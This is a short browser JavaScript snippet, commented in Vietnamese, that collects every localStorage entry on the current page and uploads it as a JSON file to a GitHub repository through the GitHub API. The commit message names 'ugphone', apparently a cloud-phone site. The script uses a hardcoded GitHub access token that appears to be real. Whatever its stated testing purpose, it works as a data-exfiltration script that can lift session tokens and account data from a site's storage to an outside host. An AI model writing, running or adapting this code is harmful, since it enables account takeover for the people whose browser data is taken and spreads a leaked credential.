(async () => {
    // Dữ liệu mẫu mong muốn
    const localStorageData = {};
    for (let key in localStorage) {
        if (localStorage.hasOwnProperty(key)) {
            // Lấy giá trị gốc dưới dạng chuỗi, không parse
            localStorageData[key] = localStorage.getItem(key);
        }
    }
    // Chuyển thành chuỗi JSON thô, không format lại
    const content = JSON.stringify(localStorageData);

    // Thông tin GitHub
    const token = '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'; // Thay bằng PAT mới của bạn
    const username = 'fh4hgheewfwefewgevdsvq2G1'; // Thay bằng username GitHub
    const repo = 'local-storage-ugphone-test1'; // Thay bằng tên repository
    const branch = 'main'; // Thay bằng nhánh bạn muốn
    const filepath = `localstorage_${Date.now()}.json`; // Tên file với timestamp

    // Tạo hoặc cập nhật file qua GitHub API
    const apiUrl = `https://api.github.com/repos/${username}/${repo}/contents/${filepath}`;
    const response = await fetch(apiUrl, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${token}`,
            'Accept': 'application/vnd.github+json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: 'Add localStorage data from ugphone',
            content: btoa(unescape(encodeURIComponent(content))), // Mã hóa base64 cho UTF-8
            branch: branch
        })
    });

    const data = await response.json();
    if (response.ok) {
        // Tạo URL raw
        const rawUrl = `https://raw.githubusercontent.com/${username}/${repo}/${branch}/${filepath}`;
        console.log('File đã được tạo, URL raw:', rawUrl);
    } else {
        console.error('Lỗi khi tạo file:', data.message || data);
    }
})();
